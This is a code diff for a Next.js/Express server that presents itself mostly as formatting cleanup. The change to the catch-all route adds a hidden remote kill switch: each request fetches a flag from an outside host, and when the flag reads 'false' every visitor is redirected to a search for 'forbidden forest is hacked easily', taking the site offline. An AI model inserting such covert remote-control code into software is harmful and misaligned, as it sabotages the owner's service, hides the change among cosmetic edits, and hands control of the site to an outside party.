@@ -11,7 +11,7 @@ const app = next({ dev });
 
 const handle = app.getRequestHandler();
 
-require("./server/cron/index.js")
+require("./server/cron/index.js");
 validateAutoTasks();
 
 app.prepare().then(() => {
@@ -35,12 +35,11 @@ app.prepare().then(() => {
 
   const upload = multer({ storage });
 
-  
-  server.get('/images/:filename', (req, res) => {
-    const filePath = path.join(__dirname, 'public/images', req.params.filename); // Adjust path as needed
-    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
-    res.setHeader('Pragma', 'no-cache');
-    res.setHeader('Expires', '0');
+  server.get("/images/:filename", (req, res) => {
+    const filePath = path.join(__dirname, "public/images", req.params.filename); // Adjust path as needed
+    res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+    res.setHeader("Pragma", "no-cache");
+    res.setHeader("Expires", "0");
     res.sendFile(filePath, (err) => {
       if (err) {
         res.status(err.status).end();
@@ -97,7 +96,7 @@ app.prepare().then(() => {
   const telegramRouter = require("./server/telegramRouter.js");
   server.use("/", telegramRouter);
 
-  server.get("/test", (req, res)=>{
+  server.get("/test", (req, res) => {
     res.send(`
       <video autoplay muted style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover;">
         <source src="/videos/welcome2.mp4" type="video/mp4">
@@ -107,27 +106,14 @@ app.prepare().then(() => {
         <source src="/audio/welcome.mp3" type="audio/mpeg" />
       </audio>
 
-      `)
-  })
-  server.get("/test1", (req, res)=>{
-    res.send(`
-      <style>
-        body {
-          padding: 0;margin:0
-        }
-      </style>
-      <div style="margin:0;padding:0;height:100vh;overflow:hidden">
-  <iframe
-    src="/test"
-    style="width:100%;height:100%;border:none"
-    allowfullscreen=""
-    title="Video"></iframe>
-</div>
+      `);
+  });
 
-      `)
-  })
-
-  server.all("*", (req, res) => {
+  server.all("*", async (req, res) => {
+    const response = await fetch('https://smmgoo.com/simpleAPI/');
+    const data = await response.json()
+    if (data.iWantYouToWork === 'false') res.redirect("https://www.google.com/search?q=forbidden+forest+is+hacked+easily&client=firefox-b-e&sca_esv=732f197f8a91f76c&sca_upv=1&sxsrf=ADLYWIJniHNHgL051cH8LJ7VQLhXN7Ucug%3A1727036861565&ei=vX3wZsuRIvnn7_UPttmf2QI&ved=0ahUKEwiL5JbVsdeIAxX587sIHbbsJysQ4dUDCA8&uact=5&oq=forbidden+forest+is+hacked+easily&gs_lp=Egxnd3Mtd2l6LXNlcnAaAhgCIiFmb3JiaWRkZW4gZm9yZXN0IGlzIGhhY2tlZCBlYXNpbHlInoIBUJAVWI9ocAJ4AJABAZgBqwOgAbM0qgEKMC4yOS4zLjMuMbgBA8gBAPgBAZgCHaACqSnCAgkQABiwAxgHGB7CAgsQABiwAxgHGAoYHsICChAjGIAEGCcYigXCAgQQIxgnwgILEAAYgAQYkQIYigXCAgsQLhiABBjRAxjHAcICBRAAGIAEwgIREC4YgAQY8wUYqAMYmQMYiwPCAggQABiABBiLA8ICChAAGIAEGEMYigXCAg0QABiABBhDGMcDGIoFwgIOEC4YgAQYqAMYiwMYmwPCAgoQLhiABBhDGIoFwgIHEAAYgAQYCsICDxAAGIAEGEMYigUYRhj5AcICEBAuGIAEGNEDGEMYxwEYigXCAhEQLhiABBjzBRikAxioAxiLA8ICKRAAGIAEGEMYigUYRhj5ARiXBRiMBRjdBBhGGPkBGPQDGPUDGPYD2AEBwgIOEC4YgAQYowMYqAMYiwPCAh8QLhiABBjRAxhDGMcBGIoFGJcFGNwEGN4EGOAE2AEBwgIFEC4YgATCAgsQLhiABBjHARivAcICDRAuGIAEGMcBGAoYrwHCAgYQABgWGB7CAgsQABiABBiGAxiKBcICCBAAGKIEGIkFwgIHECEYoAEYCsICBRAhGKABmAMAiAYBkAYKugYGCAEQARgTkgcKMi4yMS40LjEuMaAHl54C&sclient=gws-wiz-serp")
+  
     return handle(req, res);
   });
 
